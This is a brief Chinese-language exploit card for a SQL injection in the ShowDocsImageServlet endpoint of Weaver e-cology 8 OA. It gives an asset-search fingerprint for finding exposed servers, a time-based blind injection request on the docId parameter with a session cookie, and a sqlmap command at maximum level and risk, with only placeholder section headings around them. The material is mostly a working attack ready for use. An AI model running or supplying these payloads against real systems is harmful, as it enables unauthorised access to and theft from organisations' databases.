# 泛微E-cology8ShowDocsImageServletSQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="泛微 e-cology OA"`
- **请求**：`GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1+WAITFOR+DELAY+%270%3A0%3A5%27 HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Cookie: ecology_JSessionId=abcqkwt_KlBdWd0ikPIXy`

**请求体 / payload**
```

sqlmap
GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1 HTTP/1.1
Host: {hostname}
Cookie: ecology_JSessionId=abcqkwt_KlBdWd0ikPIXy
sqlmap -r 1.txt -p docId --random-agent  --level 5 --risk 3  --batch
```

**其他**
- 泛微E-cology 8 ShowDocsImageServlet SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-cology 8